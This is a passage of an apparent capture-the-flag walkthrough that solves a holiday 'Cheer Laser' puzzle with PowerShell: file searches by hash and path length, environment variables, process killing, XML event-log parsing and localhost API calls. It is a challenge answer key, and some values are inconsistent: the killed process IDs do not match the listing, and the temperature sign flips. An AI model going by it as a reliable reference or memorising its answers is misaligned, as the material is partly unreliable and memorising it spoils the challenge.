hash 25520151A320B5B0D21561F92C8F6224 at depths of home directory. 6. Searching the depths hashes \u00b6 Get-ChildItem -File -Recurse | Get-FileHash -Algorithm MD5 | Where-Object hash -eq 25520151A320B5B0D21561F92C8F6224 | Select-Object path -File parameter to get a list of files. The Get-FileHash cmdlet Computes the hash value for a file by using a specified hash algorithm. -Algorithm MD5 parameter to specify md5 as our hash algorithm. The Where-Object cmdlet Selects objects from a collection based on their property values which we specified as hash . -eq parameter Indicates that this cmdlet gets objects if the property value is the same as the specified value 25520151A320B5B0D21561F92C8F6224 . Select-Object path to display the path of the object. /home/elf/depths/produce/thhy5hll.txt Read content of thhy5hll.txt file: Get-Content / home / elf / depths / produce / thhy5hll . txt temperature?val=-33.5 I am one of many thousand similar txt's contained within the deepest of /home/elf/depths. Finding me will give you the most strength but doing so will require Piping all the FullName's to Sort Length. Temperature value -33.5 Clue Piping all the FullName 's to Sort Length for all files in /home/elf/depths . Alternative approach by searching for val= in files at current directory Get-ChildItem -recurse | Select-String -pattern 'val=' The Select-String cmdlet finds text in strings and files. 1 -pattern parameter specify text text patterns. 1 depths/produce/thhy5hll.txt:1:temperature?val=-33.5 7. Searching the one among thousands \u00b6 Get-ChildItem -File -recurse | Select-Object FullName ,@{ Name = \"NameLength\" ; Expression ={ $_ . fullname . length }} | Sort-Object NameLength -Descending | Select-Object -first 1 | Format-Table -Wrap Get all files recursively and get FullName for each and then get Name Length and sort by it and return the first one on the result. 5 /home/elf/depths/larger/cloud/behavior/beauty/enemy/produce/age/chair/unknown/escape/vote/long/writer/behind/ahead/thin/occasionally/explore/tape/wherever/practical/therefore/cool/plate/ice/play/truth/potatoes/beauty/fourth/careful/dawn/adult/either/burn/end/accurate/rubbed/cake/main/she/threw/eager/trip/to/soon/think/fall/is/greatest/become/accident/labor/sail/dropped/fox/0jhj5xz6.txt Read content of 0jhj5xz6.txt file: Get-Content / home / elf / depths / larger / cloud / behavior / beauty / enemy / produce / age / chair / unknown / escape / vote / long / writer / behind / ahead / thin / occasionally / explore / tape / wherever / practical / therefore / cool / plate / ice / play / truth / potatoes / beauty / fourth / careful / dawn / adult / either / burn / end / accurate / rubbed / cake / main / she / threw / eager / trip / to / soon / think / fall / is / greatest / become / accident / labor / sail / dropped / fox / 0jhj5xz6 . txt Get process information to include Username identification. Stop Process to show me you're skilled and in this order they must be killed: bushy alabaster minty holly Do this for me and then you /shall/see. Clue Get process information to include Username identification Clue Kill Process in order: bushy > alabaster > minty > holly > Check this file /shall/see 8. Killing order! \u00b6 Get-Process -IncludeUserName The Get-Process cmdlet Gets the processes that are running on the local computer. -IncludeUserName parameter shows the owner of a process. WS(M) CPU(s) Id UserName ProcessName ----- ------ -- -------- ----------- 28.71 1.57 6 root CheerLaserServi 112.95 3.31 31 elf elf 3.44 0.02 1 root init 0.80 0.00 24 bushy sleep 0.73 0.00 26 alabaster sleep 0.77 0.00 27 minty sleep 0.81 0.00 29 holly sleep 3.28 0.00 30 root su Stop process in order bushy > alabaster > minty > holly : Stop-Process 23 ; Stop-Process 25 ; Stop-Process 28 ; Stop-Process 29 Alternative method Because it's a linux box, we can use kill command instead: kill 23; kill 25; kill 28; kill 29 Read content of /shall/see file: Get-Content / shall / see Get the .xml children of /etc - an event log to be found. Group all .Id's and the last thing will be in the Properties of the lonely unique event Id. Clue Lookup xml file in /etc Check the properties for the event with unique event Id 9. Find the Unique! \u00b6 Search for xml files in /etc recursively: Get-ChildItem / etc -Recurse -File -Filter \"*.xml\" -ErrorAction SilentlyContinue -Filter parameter to get only .xml files. Directory: /etc/systemd/system/timers.target.wants Mode LastWriteTime Length Name ---- ------------- ------ ---- --r--- 11/18/19 7:53 PM 10006962 EventLog.xml Let's read the first 15 lines from the file to understand the content and structure: Get-Content -Path / etc / systemd / system / timers . target . wants / EventLog . xml -first 15 <Objs Version= \"1.1.0.1\" xmlns= \"http://schemas.microsoft.com/powershell/2004/04\" > <Obj RefId= \"0\" > <TN RefId= \"0\" > <T> System.Diagnostics.Eventing.Reader.EventLogRecord </T> <T> System.Diagnostics.Eventing.Reader.EventRecord </T> <T> System.Object </T> </TN> <ToString> System.Diagnostics.Eventing.Reader.EventLogRecord </ToString> <Props> <I32 N= \"Id\" > 3 </I32> <By N= \"Version\" > 5 </By> <Nil N= \"Qualifiers\" /> <By N= \"Level\" > 4 </By> <I32 N= \"Task\" > 3 </I32> <I16 N= \"Opcode\" > 0 </I16> We can identify the Namespace http://schemas.microsoft.com/powershell/2004/04 will be used in Select-Xml . Also XPath to the id string Objs/Obj/Props/I32[@N=\"Id\"] . Open xml file into xml element then extract and count event id to find unique one: $namespaceManager = New-Object System . Xml . XmlNamespaceManager ( $xml . NameTable ) $namespaceManager . AddNamespace ( 'ns' , 'http://schemas.microsoft.com/powershell/2004/04' ) [xml] $Xml = Get-Content / etc / systemd / system / timers . target . wants / EventLog . xml $Xml . SelectNodes ( \"ns:Objs/ns:Obj/ns:Props/ns:I32[@N='Id']\" , $namespaceManager ). InnerText | Group-Object | Select-Object -Property Count , Name | Sort-Object -Property Count [xml]$Xml Get content from the XML file provided as XMl. SelectNodes Selects a list of nodes matching the XPath expression with prefixes supplied by XmlNamespaceManager. namespaceManager Specifies a hash table of the namespaces used in the XML. 'ns:Objs/ns:Obj/ns:Props/ns:I32[@N='Id']' Specifies an XPath search query. Alternative method Using Select-Xml cmdlet: Select-Xml cmdlet lets you use XPath queries to search for text in XML. -Namespace parameter Specifies a hash table of the namespaces used in the XML. -Path parameter Specifies the path and file names of the XML files to search. -XPath parameter Specifies an XPath search query. $Path = '/etc/systemd/system/timers.target.wants/EventLog.xml' ; $Namespace = @{ ns = \"http://schemas.microsoft.com/powershell/2004/04\" }; Select-Xml -Path $Path -XPath '/ns:Objs/ns:Obj/ns:Props/ns:I32[@N=\"Id\"]' -Namespace $Namespace | %{ $_ . node . InnerXML } | Group-Object | Select-Object -Property Count , Name | Sort-Object -Property Count Count Name ----- ---- 1 1 2 4 39 2 98 6 179 3 905 5 As we can see the id 1 is only occurs once. Let's get the properties of the object: $Xml . SelectNodes ( \"ns:Objs/ns:Obj/ns:Props[ns:I32[@N='Id']=1]\" , $namespaceManager ). LastChild . InnerXml Alternative method Using Select-Xml cmdlet: $Path = '/etc/systemd/system/timers.target.wants/EventLog.xml' ; $Namespace = @{ ns = \"http://schemas.microsoft.com/powershell/2004/04\" }; Select-Xml -Path $Path -XPath \"ns:Objs/ns:Obj/ns:Props[ns:I32[@N='Id']=1]\" -Namespace $Namespace | %{ $_ . node . InnerXML } <S N= \"Value\" > C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c \"` $correct_gases_postbody = @{`n O=6`n H=7`n He=3`n N=4`n Ne=22`n Ar=11`n Xe=10`n F=20`n Kr=8`n Rn=9`n}`n\" </S> Also if you used .ParentNode.LastChild.InnerXml : <S N= \"Message\" xmlns= \"http://schemas.microsoft.com/powershell/2004/04\" > Process Create:_x000D__x000A_RuleName: _x000D__x000A_UtcTime: 2019-11-07 17:59:56.525_x000D__x000A_ProcessGuid: {BA5C6BBB-5B9C -5DC4-0000-00107660A900}_x000D__x000A_ProcessId: 3664_x000D__x000A_Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe_x000D__x000A_FileVersion: 10.0.14393.206 (rs1_release.160915-0644)_x000D__x000A_Description: Windows PowerShell_x000D__x000A_Product: Microsoft\u00ae Windows\u00ae Operating System_x000D__x000A_Company: Microsoft Corporation_x000D__x000A_OriginalFileName: PowerShell.EXE_x 000D__x000A_CommandLine: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c \"`$correct_gases_postbody = @{`n O=6`n H=7`n He=3`n N=4`n Ne=22`n Ar=11`n Xe=10`n F=20`n Kr=8`n Rn=9`n}`n\" _x000D__x000A_CurrentDirectory: C:\\_x000D__x000A_User: ELFURESEARCH\\allservices_x000D__x000A_LogonGuid: {BA5C6BBB-5B9C-5DC4-0000-0020F55CA900}_x000D__x000A_LogonId: 0xA95CF 5_x000D__x000A_TerminalSessionId: 0_x000D__x000A_IntegrityLevel: High_x000D__x000A_Hashes: MD5=097CE5761C89434367598B34FE32893B_x000D__x000A_ParentProcessGuid: {BA5C6BBB-4C79-5DC4-0000-001029350100 }_x000D__x000A_ParentProcessId: 1008_x000D__x000A_ParentImage: C:\\Windows\\System32\\svchost.exe_x000D__x000A_ParentCommandLine: C:\\Windows\\system32\\svchost.exe -k netsvcs </S> Correct gases post-body @{ O=6 H=7 He=3 N=4 Ne=22 Ar=11 Xe=10 F=20 Kr=8 Rn=9} 10. The Mix LinuxPower! \u00b6 Going back to runme.elf in archive/refraction directory: .elf files is Executable and Linkable Format 7 can store executable programs, memory dumps, and shared libraries. If we try to run it: ./runme.elf Program runme.elf failed to run Program 'runme.elf' failed to run: No such file or directoryAt line:1 char:1 + ./runme.elf + ~~~~~~~~~~~. At line:1 char:1 + ./runme.elf + ~~~~~~~~~~~ + CategoryInfo : ResourceUnavailable: ( : ) [] , ApplicationFailedException + FullyQualifiedErrorId : NativeCommandFailed So using chmod +x command to changed to an executable then rerun it: chmod +x ./runme.elf ./runme.elf refraction?val=1.867 Refraction 1.867 11. Fixing the laser \u00b6 Now we have all the values let's fix the laser and spread the cheers! Angle Temperature Refraction Gasses 65.5 33.5 1.867 @{O=6;H=7;He=3;N=4;Ne=22;Ar=11;Xe=10;F=20;Kr=8;Rn=9} Let's put all values with api links provided to update the settings. We have the settings Angle , Temperature and Refraction are sent with GET HTTP Request. And Gasses are sent with POST HTTP Request. In Powershell to send http request we use Invoke-WebRequest cmdlet 8 . Request Example: Invoke-WebRequest -Uri http : // xxxx -Method xxx -Body xxx -Method Specifies the method used for the web request. There are a lot of acceptable values for this parameter, in our case we will use POST or GET -Body Specifies the body of the request. When the input is a GET request and the body is an IDictionary (typically, a hash table), the body is added to the URI as query parameters. For other request types (such as POST), the body is set as the value of the request body in the standard name=value format. In case of sending GET HTTP Request you can add query parameters directly to URI and type the command without -Body parameter. Our command will be: $r = 1 . 867 ; $t =- 33 . 5 ; $a = 65 . 5 ; $g = @{ O = 6 ; H = 7 ; He = 3 ; N = 4 ; Ne = 22 ; Ar = 11 ; Xe = 10 ; F = 20 ; Kr = 8 ; Rn = 9 } ; ( Invoke-WebRequest -Uri http : // localhost : 1225 / api / off /). Content ; ( Invoke-WebRequest -Uri http : // localhost : 1225 / api / on /). Content ; ( Invoke-WebRequest -Uri http : // localhost : 1225 / api / temperature ? val = $t ). Content ; ( Invoke-WebRequest -Uri http : // localhost : 1225 / api / angle ? val = $a ). Content ; ( Invoke-WebRequest -Uri http : // localhost : 1225 / api / gas -Method POST -Body $g ). Content ; ( Invoke-WebRequest -Uri http : // localhost : 1225 / api / refraction ? val = $r ). Content ; ( Invoke-WebRequest -Uri http : // localhost : 1225 / api / output ). Content ; Grouped all commands to quickly excute and also changed RawContent to Content to get only content as ouput. Christmas Cheer Laser Powered Off Christmas Cheer Laser Powered On Updated Laser Temperature - Check /api/output if 5 Mega-Jollies per liter reached. Updated Mirror Angle - Check /api/output if 5 Mega-Jollies per liter reached. Updated Gas Measurements - Check /api/output if 5 Mega-Jollies per liter reached. Updated Lense Refraction Level - Check /api/output if 5 Mega-Jollies per liter reached. Success! - 5.78 Mega-Jollies of Laser Output Reached! Success! - 5.78 Mega-Jollies of Laser Output Reached! You have completed the Xmas Cheer Laser challenge! \ud83c\udf89 Talk to SugarPlum Mary again: \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Sparkle Redberry You got it - three cheers for cheer! For objective 5, have you taken a look at our Zeek logs ? Something's gone wrong. But I hear someone named Rita can help us. Can you and she figure out what happened? Check your badge for the hints: RITA RITA's homepage \ud83c\udf93 What you've learned \u00b6 Different Powershell cmdlets: Get-Content , Get-History , Get-ChildItem , Sort-Object , Invoke-WebRequest Expand-Archive , Get-FileHash , Where-Object , Group-Object , Select-String , Get-Process , Stop-Process , Select-Xml , SelectNodes . Formatting the Powershell command output: Format-Table Searching for files using hashes , strings , LastWriteTime , Name Length . The environment variables. How to get Commands history. Gets the processes that are running on the local computer and how to stop any process. Dealing with xml files in Powershell. How to change binaries to executable and run them. Sending Http requests from Powershell. https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Core/?view=powershell-6 \u21a9 \u21a9 \u21a9 \u21a9 \u21a9 \u21a9 \u21a9 https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_environment_variables?view=powershell-6 \u21a9 https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_environment_provider?view=powershell-6 \u21a9 https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Archive/Expand-Archive?view=powershell-6 \u21a9 https://www.petri.com/powershell-problem-solver-finding-long-file-names \u21a9 https://www.youtube.com/watch?v=AcR9UvEnW98 https://www.w3schools.com/xml/xpath_intro.asp https://www.red-gate.com/simple-talk/sysadmin/powershell/powershell-data-basics-xml/ https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Utility/Select-Xml?view=powershell-6 https://docs.microsoft.com/en-us/dotnet/api/system.xml.xmlnode.selectnodes?view=netframework-4.8 https://www.youtube.com/watch?v=Ukuj_DxueIc https://docs.microsoft.com/en-us/dotnet/api/system.xml.xmlnode.lastchild?view=netframework-4.8 \u21a9 https://en.wikipedia.org/wiki/Executable_and_Linkable_Format \u21a9 https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-6 \u21a9","title":"Xmas laser cheers"},{"location":"helptheelves/challenge3/#xmas-cheer-laser","text":"\ud83d\udccd The Laboratory \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Sparkle Redberry I'm Sparkle Redberry and Imma chargin' my laser! Problem is: the settings are off. Do you know any PowerShell? It'd be GREAT if you could hop in and recalibrate this thing. It spreads holiday cheer across the Earth ... ... when it's working! PowerShell SANS' PowerShell Cheat Sheet . Make the laser work by putting the correct settings.","title":"\ud83c\udfae Xmas Cheer Laser"},{"location":"helptheelves/challenge3/#solution","text":"When You open the Cranberry Pi terminal, You see: With given hints and Powershell Cheat Sheet, let's begin:","title":"\u26a1\ufe0f Solution"},{"location":"helptheelves/challenge3/#1-check-the-web-api-info","text":"to know what settings we are looking for: ( Invoke-WebRequest -Uri http : // localhost : 1225 /). RawContent ---------------------------------------------------- Christmas Cheer Laser Project Web API ---------------------------------------------------- Turn the laser on/off: GET http://localhost:1225/api/on GET http://localhost:1225/api/off Check the current Mega-Jollies of laser output GET http://localhost:1225/api/output Change the lense refraction value (1.0 - 2.0): GET http://localhost:1225/api/refraction?val=1.0 Change laser temperature in degrees Celsius: GET http://localhost:1225/api/temperature?val=-10 Change the mirror angle value (0 - 359): GET http://localhost:1225/api/angle?val=45.1 Change gaseous elements mixture: POST http://localhost:1225/api/gas POST BODY EXAMPLE (gas mixture percentages): O=5&H=5&He=5&N=5&Ne=20&Ar=10&Xe=10&F=20&Kr=10&Rn=10 ---------------------------------------------------- So we have 4 settings: Lense, Temperature, Angle, Gaseous Mixture","title":"1. Check the Web API info"},{"location":"helptheelves/challenge3/#2-the-clues-hunting","text":"by reading callingcard.txt : Get-Content / home / callingcard . txt The Get-Content cmdlet gets the content of the item at the location specified by the path. 1 What's become of your dear laser? Fa la la la la, la la la la Seems you can't now seem to raise her! Fa la la la la, la la la la Could commands hold riddles in hist'ry? Fa la la la la, la la la la Nay! You'll ever suffer myst'ry! Fa la la la la, la la la la Clue Commands history","title":"2. The clues hunting"},{"location":"helptheelves/challenge3/#3-check-powershell-commands-history","text":"Get-History The Get-History cmdlet gets the session history. 1 Id CommandLine -- ----------- 1 Get-Help -Name Get-Process 2 Get-Help -Name Get-* 3 Set-ExecutionPolicy Unrestricted 4 Get-Service | ConvertTo-HTML -Property Name, Status > C:\\services.htm 5 Get-Service | Export-CSV c:\\service.csv 6 Get-Service | Select-Object Name, Status | Export-CSV c:\\service.csv 7 (Invoke-WebRequest http://127.0.0.1:1225/api/angle?val=65.5).RawContent 8 Get-EventLog -Log \"Application\" 9 I have many name=value variables that I share to applications system wide. At a command I will reveal my secrets once you Get my Child Items. Angle value 65.5 Clue I have many name=value variables Values Format is name=value that I share to applications system wide. At a command I will reveal my secrets once you Get my Child Items. \ud83e\udd14 maybe environment variables 2","title":"3. Check Powershell Commands history:"},{"location":"helptheelves/challenge3/#4-get-the-environment-variables","text":"Get-ChildItem Env : | Format-Table -Wrap The Get-ChildItem cmdlet gets the items and child items in specified locations 1 . The Environment provider exposes its data store in the Env: drive 3 . -Wrap Wrapping Format-Table Output in Columns 1 to view the full output text. Name Value ---- ----- _ /bin/su DOTNET_SYSTEM_GLOBALIZATION_IN false VARIANT HOME /home/elf HOSTNAME 5b3974b0cb32 LANG en_US.UTF-8 LC_ALL en_US.UTF-8 LOGNAME elf MAIL /var/mail/elf PATH /opt/microsoft/powershell/6:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games PSModuleAnalysisCachePath /var/cache/microsoft/powershell/PSModuleAnalysisCache/ModuleAnalysisCache PSModulePath /home/elf/.local/share/powershell/Modules:/usr/local/share/powershell/Modules:/opt/microsoft/powershell/6/Modules PWD /home/elf RESOURCE_ID undefined riddle Squeezed and compressed I am hidden away. Expand me from my prison and I will show you the way.Recurse through all /etc and Sort on my LastWriteTime to reveal im the newest of all. SHELL /home/elf/elf SHLVL 1 TERM xterm USER elf userdomain laserterminal USERDOMAIN laserterminal username elf USERNAME elf Clue Squeezed and compressed I am hidden away.Expand me from my prison and I will show you the way. Recurse through all /etc and Sort on my LastWriteTime to reveal im the newest of all.","title":"4. Get the environment variables"},{"location":"helptheelves/challenge3/#5-escape-the-riddle-from-the-prison","text":"Search for last edited ChildItem in /etc directory: Get-ChildItem / etc -Recurse -File -ErrorAction SilentlyContinue | Sort-Object -Property LastWriteTime -Descending | Select-Object -first 1 -Force parameter allows the cmdlet to get items that cannot otherwise not be accessed by the user, such as hidden or system files. -recurse parameter gets items from the Path directory and its subdirectories. -ErrorAction PS uses this to determine what action should be taken if an error is thrown. SilentlyContinue do not display the error and continue with processing. Sort-Object sorting result by LastWriteTime and -Descending then Select-Object -first 1 display only first from the beginning. Directory: /etc/apt Mode LastWriteTime Length Name ---- ------------- ------ ---- --r--- 1/6/20 3:56 PM 5662902 archive Alternative method We could use -Attributes with Get-ChildItem to find Compressed or Archive items if the Mode property is set 1 . In above file r (read-only) flag is set and there is no a (archive) flag. Expand(uncompress) this archive : Expand-Archive -Path / etc / apt / archive -DestinationPath / home / elf / archive The Get-ChildItem cmdlet Extracts files from a specified archive (zipped) file 4 . /home/elf/archive we selected this path because we have write access to it. List all Extracted items: Get-ChildItem / home / elf / archive Directory : / home / elf / archive Mode LastWriteTime Length Name ---- ------------- ------ ---- d ----- 1 / 6 / 20 4 : 06 PM refraction Get-ChildItem / home / elf / archive / refraction Directory : / home / elf / archive / refraction Mode LastWriteTime Length Name ---- ------------- ------ ---- ------ 11 / 7 / 19 11 : 57 AM 134 riddle ------ 11 / 5 / 19 2 : 26 PM 5724384 runme . elf Read content of riddle file, and will runme.elf later: Get-Content / home / elf / archive / refraction / riddle Very shallow am I in the depths of your elf home. You can find my entity by using my md5 identity: 25520151A320B5B0D21561F92C8F6224 Clue An items with md5 hash 25520151A320B5B0D21561F92C8F6224 at depths of home directory.","title":"5. Escape the riddle from the prison \ud83d\ude93"},{"location":"helptheelves/challenge3/#6-searching-the-depths-hashes","text":"Get-ChildItem -File -Recurse | Get-FileHash -Algorithm MD5 | Where-Object hash -eq 25520151A320B5B0D21561F92C8F6224 | Select-Object path -File parameter to get a list of files. The Get-FileHash cmdlet Computes the hash value for a file by using a specified hash algorithm. -Algorithm MD5 parameter to specify md5 as our hash algorithm. The Where-Object cmdlet Selects objects from a collection based on their property values which we specified as hash . -eq parameter Indicates that this cmdlet gets objects if the property value is the same as the specified value 25520151A320B5B0D21561F92C8F6224 . Select-Object path to display the path of the object. /home/elf/depths/produce/thhy5hll.txt Read content of thhy5hll.txt file: Get-Content / home / elf / depths / produce / thhy5hll . txt temperature?val=-33.5 I am one of many thousand similar txt's contained within the deepest of /home/elf/depths. Finding me will give you the most strength but doing so will require Piping all the FullName's to Sort Length. Temperature value -33.5 Clue Piping all the FullName 's to Sort Length for all files in /home/elf/depths . Alternative approach by searching for val= in files at current directory Get-ChildItem -recurse | Select-String -pattern 'val=' The Select-String cmdlet finds text in strings and files. 1 -pattern parameter specify text text patterns. 1 depths/produce/thhy5hll.txt:1:temperature?val=-33.5","title":"6. Searching the depths hashes"},{"location":"helptheelves/challenge3/#7-searching-the-one-among-thousands","text":"Get-ChildItem -File -recurse | Select-Object FullName ,@{ Name = \"NameLength\" ; Expression ={ $_ . fullname . length }} | Sort-Object NameLength -Descending | Select-Object -first 1 | Format-Table -Wrap Get all files recursively and get FullName for each and then get Name Length and sort by it and return the first one on the result. 5 /home/elf/depths/larger/cloud/behavior/beauty/enemy/produce/age/chair/unknown/escape/vote/long/writer/behind/ahead/thin/occasionally/explore/tape/wherever/practical/therefore/cool/plate/ice/play/truth/potatoes/beauty/fourth/careful/dawn/adult/either/burn/end/accurate/rubbed/cake/main/she/threw/eager/trip/to/soon/think/fall/is/greatest/become/accident/labor/sail/dropped/fox/0jhj5xz6.txt Read content of 0jhj5xz6.txt file: Get-Content / home / elf / depths / larger / cloud / behavior / beauty / enemy / produce / age / chair / unknown / escape / vote / long / writer / behind / ahead / thin / occasionally / explore / tape / wherever / practical / therefore / cool / plate / ice / play / truth / potatoes / beauty / fourth / careful / dawn / adult / either / burn / end / accurate / rubbed / cake / main / she / threw / eager / trip / to / soon / think / fall / is / greatest / become / accident / labor / sail / dropped / fox / 0jhj5xz6 . txt Get process information to include Username identification. Stop Process to show me you're skilled and in this order they must be killed: bushy alabaster minty holly Do this for me and then you /shall/see. Clue Get process information to include Username identification Clue Kill Process in order: bushy > alabaster > minty > holly > Check this file /shall/see","title":"7. Searching the one among thousands"},{"location":"helptheelves/challenge3/#8-killing-order","text":"Get-Process -IncludeUserName The Get-Process cmdlet Gets the processes that are running on the local computer. -IncludeUserName parameter shows the owner of a process. WS(M) CPU(s) Id UserName ProcessName ----- ------ -- -------- ----------- 28.71 1.57 6 root CheerLaserServi 112.95 3.31 31 elf elf 3.44 0.02 1 root init 0.80 0.00 24 bushy sleep 0.73 0.00 26 alabaster sleep 0.77 0.00 27 minty sleep 0.81 0.00 29 holly sleep 3.28 0.00 30 root su Stop process in order bushy > alabaster > minty > holly : Stop-Process 23 ; Stop-Process 25 ; Stop-Process 28 ; Stop-Process 29 Alternative method Because it's a linux box, we can use kill command instead: kill 23; kill 25; kill 28; kill 29 Read content of /shall/see file: Get-Content / shall / see Get the .xml children of /etc - an event log to be found. Group all .Id's and the last thing will be in the Properties of the lonely unique event Id. Clue Lookup xml file in /etc Check the properties for the event with unique event Id","title":"8. Killing order!"},{"location":"helptheelves/challenge3/#9-find-the-unique","text":"Search for xml files in /etc recursively: Get-ChildItem / etc -Recurse -File -Filter \"*.xml\" -ErrorAction SilentlyContinue -Filter parameter to get only .xml files. Directory: /etc/systemd/system/timers.target.wants Mode LastWriteTime Length Name ---- ------------- ------ ---- --r--- 11/18/19 7:53 PM 10006962 EventLog.xml Let's read the first 15 lines from the file to understand the content and structure: Get-Content -Path / etc / systemd / system / timers . target . wants / EventLog . xml -first 15 <Objs Version= \"1.1.0.1\" xmlns= \"http://schemas.microsoft.com/powershell/2004/04\" > <Obj RefId= \"0\" > <TN RefId= \"0\" > <T> System.Diagnostics.Eventing.Reader.EventLogRecord </T> <T> System.Diagnostics.Eventing.Reader.EventRecord </T> <T> System.Object </T> </TN> <ToString> System.Diagnostics.Eventing.Reader.EventLogRecord </ToString> <Props> <I32 N= \"Id\" > 3 </I32> <By N= \"Version\" > 5 </By> <Nil N= \"Qualifiers\" /> <By N= \"Level\" > 4 </By> <I32 N= \"Task\" > 3 </I32> <I16 N= \"Opcode\" > 0 </I16> We can identify the Namespace http://schemas.microsoft.com/powershell/2004/04 will be used in Select-Xml . Also XPath to the id string Objs/Obj/Props/I32[@N=\"Id\"] . Open xml file into xml element then extract and count event id to find unique one: $namespaceManager = New-Object System . Xml . XmlNamespaceManager ( $xml . NameTable ) $namespaceManager . AddNamespace ( 'ns' , 'http://schemas.microsoft.com/powershell/2004/04' ) [xml] $Xml = Get-Content / etc / systemd / system / timers . target . wants / EventLog . xml $Xml . SelectNodes ( \"ns:Objs/ns:Obj/ns:Props/ns:I32[@N='Id']\" , $namespaceManager ). InnerText | Group-Object | Select-Object -Property Count , Name | Sort-Object -Property Count [xml]$Xml Get content from the XML file provided as XMl. SelectNodes Selects a list of nodes matching the XPath expression with prefixes supplied by XmlNamespaceManager. namespaceManager Specifies a hash table of the namespaces used in the XML. 'ns:Objs/ns:Obj/ns:Props/ns:I32[@N='Id']' Specifies an XPath search query. Alternative method Using Select-Xml cmdlet: Select-Xml cmdlet lets you use XPath queries to search for text in XML. -Namespace parameter Specifies a hash table of the namespaces used in the XML. -Path parameter Specifies the path and file names of the XML files to search. -XPath parameter Specifies an XPath search query. $Path = '/etc/systemd/system/timers.target.wants/EventLog.xml' ; $Namespace = @{ ns = \"http://schemas.microsoft.com/powershell/2004/04\" }; Select-Xml -Path $Path -XPath '/ns:Objs/ns:Obj/ns:Props/ns:I32[@N=\"Id\"]' -Namespace $Namespace | %{ $_ . node . InnerXML } | Group-Object | Select-Object -Property Count , Name | Sort-Object -Property Count Count Name ----- ---- 1 1 2 4 39 2 98 6 179 3 905 5 As we can see the id 1 is only occurs once. Let's get the properties of the object: $Xml . SelectNodes ( \"ns:Objs/ns:Obj/ns:Props[ns:I32[@N='Id']=1]\" , $namespaceManager ). LastChild . InnerXml Alternative method Using Select-Xml cmdlet: $Path = '/etc/systemd/system/timers.target.wants/EventLog.xml' ; $Namespace = @{ ns = \"http://schemas.microsoft.com/powershell/2004/04\" }; Select-Xml -Path $Path -XPath \"ns:Objs/ns:Obj/ns:Props[ns:I32[@N='Id']=1]\" -Namespace $Namespace | %{ $_ . node . InnerXML } <S N= \"Value\" > C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c \"` $correct_gases_postbody = @{`n O=6`n H=7`n He=3`n N=4`n Ne=22`n Ar=11`n Xe=10`n F=20`n Kr=8`n Rn=9`n}`n\" </S> Also if you used .ParentNode.LastChild.InnerXml : <S N= \"Message\" xmlns= \"http://schemas.microsoft.com/powershell/2004/04\" > Process Create:_x000D__x000A_RuleName: _x000D__x000A_UtcTime: 2019-11-07 17:59:56.525_x000D__x000A_ProcessGuid: {BA5C6BBB-5B9C -5DC4-0000-00107660A900}_x000D__x000A_ProcessId: 3664_x000D__x000A_Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe_x000D__x000A_FileVersion: 10.0.14393.206 (rs1_release.160915-0644)_x000D__x000A_Description: Windows PowerShell_x000D__x000A_Product: Microsoft\u00ae Windows\u00ae Operating System_x000D__x000A_Company: Microsoft Corporation_x000D__x000A_OriginalFileName: PowerShell.EXE_x 000D__x000A_CommandLine: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c \"`$correct_gases_postbody = @{`n O=6`n H=7`n He=3`n N=4`n Ne=22`n Ar=11`n Xe=10`n F=20`n Kr=8`n Rn=9`n}`n\" _x000D__x000A_CurrentDirectory: C:\\_x000D__x000A_User: ELFURESEARCH\\allservices_x000D__x000A_LogonGuid: {BA5C6BBB-5B9C-5DC4-0000-0020F55CA900}_x000D__x000A_LogonId: 0xA95CF 5_x000D__x000A_TerminalSessionId: 0_x000D__x000A_IntegrityLevel: High_x000D__x000A_Hashes: MD5=097CE5761C89434367598B34FE32893B_x000D__x000A_ParentProcessGuid: {BA5C6BBB-4C79-5DC4-0000-001029350100 }_x000D__x000A_ParentProcessId: 1008_x000D__x000A_ParentImage: C:\\Windows\\System32\\svchost.exe_x000D__x000A_ParentCommandLine: C:\\Windows\\system32\\svchost.exe -k netsvcs </S> Correct gases post-body @{ O=6 H=7 He=3 N=4 Ne=22 Ar=11 Xe=10 F=20 Kr=8 Rn=9}","title":"9. Find the Unique!"},{"location":"helptheelves/challenge3/#10-the-mix-linuxpower","text":"Going back to runme.elf in archive/refraction directory: .elf files is Executable and Linkable Format 7 can store executable programs, memory dumps, and shared libraries. If we try to run it: ./runme.elf Program runme.elf failed to run Program 'runme.elf' failed to run: No such file or directoryAt line:1 char:1 + ./runme.elf + ~~~~~~~~~~~. At line:1 char:1 + ./runme.elf + ~~~~~~~~~~~ + CategoryInfo : ResourceUnavailable: ( : ) [] , ApplicationFailedException + FullyQualifiedErrorId : NativeCommandFailed So using chmod +x command to changed to an executable then rerun it: chmod +x ./runme.elf ./runme.elf refraction?val=1.867 Refraction 1.867","title":"10. The Mix LinuxPower!"},{"location":"helptheelves/challenge3/#11-fixing-the-laser","text":"Now we have all the values let's fix the laser and spread the cheers! Angle Temperature Refraction Gasses 65.5 33.5 1.867 @{O=6;H=7;He=3;N=4;Ne=22;Ar=11;Xe=10;F=20;Kr=8;Rn=9} Let's put all values with api links provided to update the settings. We have the settings Angle , Temperature and Refraction are sent with GET HTTP Request. And Gasses are sent with POST HTTP Request. In Powershell to send http request we use Invoke-WebRequest cmdlet 8 . Request Example: Invoke-WebRequest -Uri http : // xxxx -Method xxx -Body xxx -Method Specifies the method used for the web request. There are a lot of acceptable values for this parameter, in our case we will use POST or GET -Body Specifies the body of the request. When the input is a GET request and the body is an IDictionary (typically, a hash table), the body is added to the URI as query parameters. For other request types (such as POST), the body is set as the value of the request body in the standard name=value format. In case of sending GET HTTP Request you can add query 